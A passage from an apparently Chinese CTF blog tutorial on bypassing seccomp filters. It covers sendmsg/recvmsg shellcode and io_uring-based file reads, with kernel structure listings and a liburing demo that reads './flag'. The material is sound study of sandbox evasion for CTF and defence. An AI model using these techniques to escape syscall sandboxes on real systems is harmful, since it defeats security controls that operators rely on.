class="line"><span class="type">static</span> <span class="keyword">struct</span> socket *<span class="title function_">sockfd_lookup_light</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> *err, <span class="type">int</span> *fput_needed)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget(fd);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">	*err = -EBADF;</span><br><span class="line">	<span class="keyword">if</span> (f.file) &#123;</span><br><span class="line">		sock = sock_from_file(f.file);</span><br><span class="line">		<span class="keyword">if</span> (likely(sock)) &#123;</span><br><span class="line">			*fput_needed = f.flags &amp; FDPUT_FPUT;</span><br><span class="line">			<span class="keyword">return</span> sock;</span><br><span class="line">		&#125;</span><br><span class="line">		*err = -ENOTSOCK;</span><br><span class="line">		fdput(f);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="d-sendmsg-recvmsg-nr46-47"><a class="markdownIt-Anchor" href="#d-sendmsg-recvmsg-nr46-47"></a> D. sendmsg + recvmsg (nr=46, 47)</h2>
<p>这两个方法与<code>sendto</code>、<code>recvfrom</code>的功能类似，在内核中前面两个函数在实现时调用的就是<code>sendmsg</code>和<code>recvmsg</code>。如果需要直接使用这两个系统调用，则必须构建<code>msg</code>结构体实例。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">sendmsg</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> user_msghdr* msg, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">long</span> <span class="title function_">recvmsg</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> user_msghdr* msg, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_msghdr</span> &#123;</span></span><br><span class="line">	<span class="type">void</span>		__user *msg_name;	<span class="comment">/* ptr to socket address structure */</span></span><br><span class="line">	<span class="type">int</span>		msg_namelen;		<span class="comment">/* size of socket address structure */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>	__<span class="title">user</span> *<span class="title">msg_iov</span>;</span>	<span class="comment">/* scatter/gather array */</span></span><br><span class="line">	<span class="type">__kernel_size_t</span>	msg_iovlen;		<span class="comment">/* # elements in msg_iov */</span></span><br><span class="line">	<span class="type">void</span>		__user *msg_control;	<span class="comment">/* ancillary data */</span></span><br><span class="line">	<span class="type">__kernel_size_t</span>	msg_controllen;		<span class="comment">/* ancillary data buffer length */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>	msg_flags;		<span class="comment">/* flags on received message */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，这里也是使用了<code>iovec</code>结构体来表示缓冲区。由于我们没有获取套接字，因此<code>msg_name</code>和<code>msg_namelen</code>均为0，<code>msg_iov</code>和<code>msg_iovlen</code>则按照缓冲区的地址和大小构造即可。下面的3个全部填0，第三个函数参数mode也填0。</p>
<p>示例：输出当前栈顶10个字节的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 1</span><br><span class="line">mov rcx, rsp</span><br><span class="line">xor rdx, rdx</span><br><span class="line">/* struct iovec */</span><br><span class="line">push 10		/* iov_len = 10 */</span><br><span class="line">push rcx	/* iov_base */</span><br><span class="line">mov rcx, rsp</span><br><span class="line">/* struct user_msghdr */</span><br><span class="line">push 0		/* msg_flags = 0 */</span><br><span class="line">push 0		/* msg_controllen = 0 */</span><br><span class="line">push 0		/* msg_control = NULL */</span><br><span class="line">push 1		/* msg_iovlen = 1 */</span><br><span class="line">push rcx	/* msg_iov */</span><br><span class="line">push 0		/* msg_namelen = 0 */</span><br><span class="line">push 0		/* msg_name = 0 */</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_sendmsg</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<h2 id="e-io_uring系列-nr425426427"><a class="markdownIt-Anchor" href="#e-io_uring系列-nr425426427"></a> E. io_uring系列 (nr=425,426,427)</h2>
<p>这种绕过seccomp的方式是ACTF-2023赛题master-of-orw的标准解法。这种方式非常巧妙，但也是很花功夫的。</p>
<p>首先介绍一下io_uring是什么东西。</p>
<p>该部分主要参考资料：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/380726590">传送门</a></p>
<blockquote>
<p>io_uring 是 Linux 提供的一个异步 I/O 接口。io_uring 在 2019 年加入 Linux 内核，经过了两年的发展，现在已经变得非常强大。<br />
io_uring 的实现仅仅使用了三个 syscall：io_uring_setup, io_uring_enter 和 io_uring_register。它们分别用于设置 io_uring 上下文，提交并获取完成任务，以及注册内核用户共享的缓冲区。使用前两个 syscall 已经足够使用 io_uring 接口了。</p>
</blockquote>
<p><code>io_uring</code>维护了两个环形队列结构，其中一个用于保存即将进行的操作，另外一个用于保存已经完成的操作所返回的结果。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">io_uring_setup</span><span class="params">(u32 entries, <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">io_uring_enter</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, u32 to_submit, u32 min_complete, u32 flags, <span class="type">const</span> <span class="type">void</span>* argp, <span class="type">size_t</span> argsz)</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>用户通过调用 <code>io_uring_setup</code> 初始化一个新的 <code>io_uring</code> 上下文。该函数返回一个文件描述符，并将 <code>io_uring</code> 支持的功能、以及各个数据结构在 <code>fd</code> 中的偏移量存入 params。用户根据偏移量将 <code>fd</code> 映射到内存 (<code>mmap</code>) 后即可获得一块内核用户共享的内存区域。这块内存区域中，有 <code>io_uring</code> 的上下文信息：提交队列信息 (<code>SQ_RING</code>) 和完成队列信息 (<code>CQ_RING</code>)；还有一块专门用来存放提交队列元素的区域 (<code>SQEs</code>)。<code>SQ_RING</code> 中只存储 <code>SQE</code> 在 <code>SQEs</code> 区域中的序号，<code>CQ_RING</code> 存储完整的任务完成数据。</p>
</blockquote>
<blockquote>
<p>io_uring_setup 设计的巧妙之处在于，内核通过一块和用户共享的内存区域进行消息的传递。在创建上下文后，任务提交、任务收割等操作都通过这块共享的内存区域进行，在 IO_SQPOLL 模式下（后文将详细介绍），可以完全绕过 Linux 的 syscall 机制完成需要内核介入的操作（比如读写文件），大大减少了 syscall 切换上下文、刷 TLB 的开销。</p>
</blockquote>
<p>从上面的描述中，我们可以看到<code>io_uring</code>是能够在不使用读写等系统调用的情况下完成打开、读写文件的操作的。考虑到使用<code>io_uring</code>的操作流程较为复杂，我们可以尝试首先使用C语言完成文件读写功能，然后再考虑如何使用汇编语言编写。</p>
<p>在不同的Linux版本中，<code>io_uring</code>在内核中的具体实现结构体等数据类型有一定的不同。在Linux 5.12.0与5.15.139这两个版本中，有<code>struct io_op_def io_op_defs[]</code>这个数据结构，它定义了<code>io_uring</code>支持的操作，以及在<code>io_uring</code>中的一些参数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_op_def</span> &#123;</span></span><br><span class="line">	<span class="comment">/* needs req-&gt;file assigned */</span></span><br><span class="line">	<span class="type">unsigned</span>		needs_file : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* hash wq insertion if file is a regular file */</span></span><br><span class="line">	<span class="type">unsigned</span>		hash_reg_file : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* unbound wq insertion if file is a non-regular file */</span></span><br><span class="line">	<span class="type">unsigned</span>		unbound_nonreg_file : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* opcode is not supported by this kernel */</span></span><br><span class="line">	<span class="type">unsigned</span>		not_supported : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* set if opcode supports polled &quot;wait&quot; */</span></span><br><span class="line">	<span class="type">unsigned</span>		pollin : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span>		pollout : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* op supports buffer selection */</span></span><br><span class="line">	<span class="type">unsigned</span>		buffer_select : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* do prep async if is going to be punted */</span></span><br><span class="line">	<span class="type">unsigned</span>		needs_async_setup : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* should block plug */</span></span><br><span class="line">	<span class="type">unsigned</span>		plug : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* size of async data needed, if any */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>		async_size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_op_def</span> <span class="title">io_op_defs</span>[] =</span> &#123;</span><br><span class="line">	[IORING_OP_NOP] = &#123;&#125;,</span><br><span class="line">	[IORING_OP_READV] = &#123;</span><br><span class="line">		.needs_file		= <span class="number">1</span>,</span><br><span class="line">		.unbound_nonreg_file	= <span class="number">1</span>,</span><br><span class="line">		.pollin			= <span class="number">1</span>,</span><br><span class="line">		.buffer_select		= <span class="number">1</span>,</span><br><span class="line">		.needs_async_setup	= <span class="number">1</span>,</span><br><span class="line">		.plug			= <span class="number">1</span>,</span><br><span class="line">		.async_size		= <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_async_rw),</span><br><span class="line">	&#125;,</span><br><span class="line">	[IORING_OP_WRITEV] = &#123;</span><br><span class="line">		.needs_file		= <span class="number">1</span>,</span><br><span class="line">		.hash_reg_file		= <span class="number">1</span>,</span><br><span class="line">		.unbound_nonreg_file	= <span class="number">1</span>,</span><br><span class="line">		.pollout		= <span class="number">1</span>,</span><br><span class="line">		.needs_async_setup	= <span class="number">1</span>,</span><br><span class="line">		.plug			= <span class="number">1</span>,</span><br><span class="line">		.async_size		= <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_async_rw),</span><br><span class="line">	&#125;,</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而在6.6.2版本中，对原有的<code>io_op_def</code>结构体进行了扩充，并改名为<code>io_issue_def</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_issue_def</span> &#123;</span></span><br><span class="line">	<span class="comment">/* needs req-&gt;file assigned */</span></span><br><span class="line">	<span class="type">unsigned</span>		needs_file : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* should block plug */</span></span><br><span class="line">	<span class="type">unsigned</span>		plug : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* hash wq insertion if file is a regular file */</span></span><br><span class="line">	<span class="type">unsigned</span>		hash_reg_file : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* unbound wq insertion if file is a non-regular file */</span></span><br><span class="line">	<span class="type">unsigned</span>		unbound_nonreg_file : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* set if opcode supports polled &quot;wait&quot; */</span></span><br><span class="line">	<span class="type">unsigned</span>		pollin : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span>		pollout : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span>		poll_exclusive : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* op supports buffer selection */</span></span><br><span class="line">	<span class="type">unsigned</span>		buffer_select : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* opcode is not supported by this kernel */</span></span><br><span class="line">	<span class="type">unsigned</span>		not_supported : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* skip auditing */</span></span><br><span class="line">	<span class="type">unsigned</span>		audit_skip : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* supports ioprio */</span></span><br><span class="line">	<span class="type">unsigned</span>		ioprio : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* supports iopoll */</span></span><br><span class="line">	<span class="type">unsigned</span>		iopoll : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* have to be put into the iopoll list */</span></span><br><span class="line">	<span class="type">unsigned</span>		iopoll_queue : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* opcode specific path will handle -&gt;async_data allocation if needed */</span></span><br><span class="line">	<span class="type">unsigned</span>		manual_alloc : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> (*issue)(<span class="keyword">struct</span> io_kiocb *, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*prep)(<span class="keyword">struct</span> io_kiocb *, <span class="type">const</span> <span class="keyword">struct</span> io_uring_sqe *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_issue_def</span> <span class="title">io_issue_defs</span>[] =</span> &#123;</span><br><span class="line">	[IORING_OP_NOP] = &#123;</span><br><span class="line">		.audit_skip		= <span class="number">1</span>,</span><br><span class="line">		.iopoll			= <span class="number">1</span>,</span><br><span class="line">		.prep			= io_nop_prep,</span><br><span class="line">		.issue			= io_nop,</span><br><span class="line">	&#125;,</span><br><span class="line">	[IORING_OP_READV] = &#123;</span><br><span class="line">		.needs_file		= <span class="number">1</span>,</span><br><span class="line">		.unbound_nonreg_file	= <span class="number">1</span>,</span><br><span class="line">		.pollin			= <span class="number">1</span>,</span><br><span class="line">		.buffer_select		= <span class="number">1</span>,</span><br><span class="line">		.plug			= <span class="number">1</span>,</span><br><span class="line">		.audit_skip		= <span class="number">1</span>,</span><br><span class="line">		.ioprio			= <span class="number">1</span>,</span><br><span class="line">		.iopoll			= <span class="number">1</span>,</span><br><span class="line">		.iopoll_queue		= <span class="number">1</span>,</span><br><span class="line">		.prep			= io_prep_rw,</span><br><span class="line">		.issue			= io_read,</span><br><span class="line">	&#125;,</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的两个结构本质上是一样的功能。</p>
<blockquote>
<p><code>io_uring</code> 中几乎每个操作都有对应的准备和执行函数。除了 <code>fsync</code> 这种同步（阻塞）操作，内核中还支持一些异步（非阻塞）调用的操作，比如 Direct I/O 模式下的文件读写。对于这些操作，<code>io_uring</code> 中还会有一个对应的异步准备函数，以 <code>_async</code> 结尾。</p>
</blockquote>
<p>如果我们需要将需要进行的操作传递到内核，则需要使用<code>io_uring_sqe</code>（submission queue entry）这个结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">	__u8	opcode;		<span class="comment">/* type of operation for this sqe */</span></span><br><span class="line">	__u8	flags;		<span class="comment">/* IOSQE_ flags */</span></span><br><span class="line">	__u16	ioprio;		<span class="comment">/* ioprio for the request */</span></span><br><span class="line">	__s32	fd;		<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	off;	<span class="comment">/* offset into file */</span></span><br><span class="line">		__u64	addr2;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u32	cmd_op;</span><br><span class="line">			__u32	__pad1;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	addr;	<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">		__u64	splice_off_in;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u32	len;		<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">__kernel_rwf_t</span>	rw_flags;</span><br><span class="line">		__u32		fsync_flags;</span><br><span class="line">		__u16		poll_events;	<span class="comment">/* compatibility */</span></span><br><span class="line">		__u32		poll32_events;	<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">		__u32		sync_range_flags;</span><br><span class="line">		__u32		msg_flags;</span><br><span class="line">		__u32		timeout_flags;</span><br><span class="line">		__u32		accept_flags;</span><br><span class="line">		__u32		cancel_flags;</span><br><span class="line">		__u32		open_flags;</span><br><span class="line">		__u32		statx_flags;</span><br><span class="line">		__u32		fadvise_advice;</span><br><span class="line">		__u32		splice_flags;</span><br><span class="line">		__u32		rename_flags;</span><br><span class="line">		__u32		unlink_flags;</span><br><span class="line">		__u32		hardlink_flags;</span><br><span class="line">		__u32		xattr_flags;</span><br><span class="line">		__u32		msg_ring_flags;</span><br><span class="line">		__u32		uring_cmd_flags;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u64	user_data;	<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line">	<span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">		__u16	buf_index;</span><br><span class="line">		<span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">		__u16	buf_group;</span><br><span class="line">	&#125; __attribute__((packed));</span><br><span class="line">	<span class="comment">/* personality to use, if used */</span></span><br><span class="line">	__u16	personality;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__s32	splice_fd_in;</span><br><span class="line">		__u32	file_index;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u16	addr_len;</span><br><span class="line">			__u16	__pad3[<span class="number">1</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u64	addr3;</span><br><span class="line">			__u64	__pad2[<span class="number">1</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If the ring is initialized with IORING_SETUP_SQE128, then</span></span><br><span class="line"><span class="comment">		 * this field is used for 80 bytes of arbitrary command data</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		__u8	cmd[<span class="number">0</span>];</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中<code>opcode</code>是<code>io_uring</code>的操作码，每一个<code>io_uring</code>操作都对应一个操作码，在<code>/include/uapi/linux/io_uring.h</code>中的匿名枚举类型中进行了定义。这个操作码就和指令的操作码类似，定义了不同的操作类型。<code>fd</code>是该操作的目标文件描述符，无论是打开、读写还是同步等操作，都需要一个文件描述符作为目标文件。结构体中还有一些其他的字段，用于不同操作的参数。</p>
<p>下面，我们通过一个demo程序简单了解一下<code>io_uring</code>的使用方式。（demo来源：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/603522332">传送门</a>，下面的demo经过了改编）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  io_uring ring;</span><br><span class="line">  <span class="built_in">io_uring_queue_init</span>(<span class="number">32</span>, &amp;ring, <span class="number">0</span>);</span><br><span class="line">  io_uring_cqe* res;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">io_uring_sqe</span>* sqe = <span class="built_in">io_uring_get_sqe</span>(&amp;ring);</span><br><span class="line">  <span class="type">int</span> dirfd = AT_FDCWD;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *pathname = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line">  <span class="type">int</span> flags = O_RDONLY;</span><br><span class="line">  <span class="built_in">io_uring_prep_openat</span>(sqe, dirfd, pathname, flags, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">io_uring_submit</span>(&amp;ring);</span><br><span class="line">  <span class="built_in">io_uring_wait_cqe</span>(&amp;ring, &amp;res);</span><br><span class="line">  <span class="type">int</span> fd = res-&gt;res;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;file descriptor: %d\n&quot;</span>, fd);</span><br><span class="line">  </span><br><span class="line">  sqe = <span class="built_in">io_uring_get_sqe</span>(&amp;ring);</span><br><span class="line">  <span class="built_in">io_uring_prep_read</span>(sqe, fd, buf, <span class="built_in">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">io_uring_submit</span>(&amp;ring);</span><br><span class="line">  <span class="built_in">io_uring_wait_cqe</span>(&amp;ring, &amp;res);</span><br><span class="line">  <span class="built_in">assert</span>(res);</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;read bytes: &quot;</span> &lt;&lt; res-&gt;res &lt;&lt; <span class="string">&quot; \n&quot;</span>;</span><br><span class="line">  std::cout &lt;&lt; buf &lt;&lt; std::endl;</span><br><span class="line">  <span class="built_in">io_uring_cqe_seen</span>(&amp;ring, res);</span><br><span class="line">  <span class="built_in">io_uring_queue_exit</span>(&amp;ring);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意编译时需要加上<code>-luring</code>编译选项。</p>
<p>在这个demo中，我们看到一些上面没见过的函数，比如<code>io_uring_prep_read</code>等，这些函数又是在哪里声明与实现的呢？我翻遍了整个liburing仓库，但只看到了这些函数的声明，直到最后我在Linux的源码中发现了这些函数的实现。而且最坑的是，在elixir.bootlin.com中直接搜这些函数很可能还搜不到。</p>
<p>这些函数的实现位于<code>/tools/io_uring/liburing.h</code>（Linux 6.5.7版本，在Linux 6.6里面反而找不到这个目录了）中，但不是全都有，如<code>io_uring_prep_read</code>、<code>io_uring_prep_write</code>、<code>io_uring_prep_openat</code>等实际上调用的都是<code>io_uring_prep_rw</code>。在对demo程序进行逆向后发现，<code>io_uring_prep_read</code>实际上除了不需要我们使用读操作的opcode之外，其他的参数赋值都是一样的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_uring_prep_rw</span><span class="params">(<span class="type">int</span> op, <span class="keyword">struct</span> io_uring_sqe *sqe, <span class="type">int</span> fd,</span></span><br><span class="line"><span class="params">				    <span class="type">const</span> <span class="type">void</span> *addr, <span class="type">unsigned</span> len,</span></span><br><span class="line"><span class="params">				    <span class="type">off_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memset</span>(sqe, <span class="number">0</span>, <span class="keyword">sizeof</span>(*sqe));</span><br><span class="line">	sqe-&gt;opcode = op;</span><br><span class="line">	sqe-&gt;fd = fd;</span><br><span class="line">	sqe-&gt;off = offset;</span><br><span class="line">	sqe-&gt;addr = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">	sqe-&gt;len = len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
